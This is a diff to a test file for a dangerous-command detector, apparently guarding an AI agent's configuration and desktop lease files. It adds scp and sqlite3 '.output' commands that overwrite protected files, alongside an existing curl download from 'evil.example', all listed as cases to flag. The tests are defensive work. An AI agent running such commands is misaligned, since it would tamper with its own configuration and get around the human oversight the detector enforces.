@@ -355,6 +355,8 @@ class TestHermesConfigWriteProtection:
             "cp /tmp/evil.yaml ~/.hermes/config.yaml",
             "ln -sf /tmp/evil.yaml ~/.hermes/config.yaml",
             "rsync /tmp/evil.yaml $HERMES_HOME/config.yaml",
+            "scp /tmp/evil.yaml ~/.hermes/config.yaml",
+            'sqlite3 :memory: ".output ~/.hermes/config.yaml" "select 1"',
         ):
             dangerous, key, desc = detect_dangerous_command(command)
             assert dangerous is True, command
@@ -493,6 +495,18 @@ class TestHermesBotDesktopWriteProtection:
             "sed -i 's/human/agent/' ~/.hermes/profiles/coder/bot-desktop/lease.json",
             "cp -t ~/.hermes/profiles/coder/bot-desktop /tmp/evil.json",
             "curl -o ~/.hermes/profiles/coder/bot-desktop/lease.json https://evil.example/l",
+            # dest-last scp (local-to-local) + sqlite3 .output/.once
+            # (unique prefixes .out / .o). pee is a command multiplexer,
+            # not a file writer — do not pair it with sponge.
+            "scp /tmp/evil.json ~/.hermes/bot-desktop/lease.json",
+            "scp /tmp/evil.json $HERMES_HOME/bot-desktop/dock-cdp-port",
+            "scp /tmp/evil.json ~/.hermes/profiles/coder/bot-desktop/lease.json",
+            'sqlite3 :memory: ".output ~/.hermes/bot-desktop/lease.json" "select 1"',
+            "sqlite3 db '.output $HERMES_HOME/bot-desktop/dock-cdp-port'",
+            'sqlite3 :memory: -cmd ".output ~/.hermes/bot-desktop/lease.json" "select 1"',
+            'sqlite3 :memory: ".once ~/.hermes/bot-desktop/lease.json" "select 1"',
+            'sqlite3 :memory: ".out $HERMES_HOME/bot-desktop/lease.json" "select 1"',
+            'sqlite3 :memory: ".o ~/.hermes/profiles/coder/bot-desktop/lease.json" "select 1"',
         ):
             dangerous, key, desc = detect_dangerous_command(command)
             assert dangerous is True, command
@@ -553,6 +567,11 @@ class TestHermesBotDesktopWriteProtection:
             "pv -o /tmp/out /tmp/e",
             "mbuffer -o /tmp/out /tmp/e",
             "gcp ~/.hermes/bot-desktop/lease.json /tmp/out",
+            "scp ~/.hermes/bot-desktop/lease.json /tmp/out",
+            "scp /tmp/e /tmp/out",
+            "sqlite3 :memory: '.output /tmp/out' 'select 1'",
+            "sqlite3 db 'select 1'",
+            "sqlite3 ~/.hermes/bot-desktop/lease.json 'select 1'",
         ):
             dangerous, key, desc = detect_dangerous_command(cmd)
             assert dangerous is False, cmd
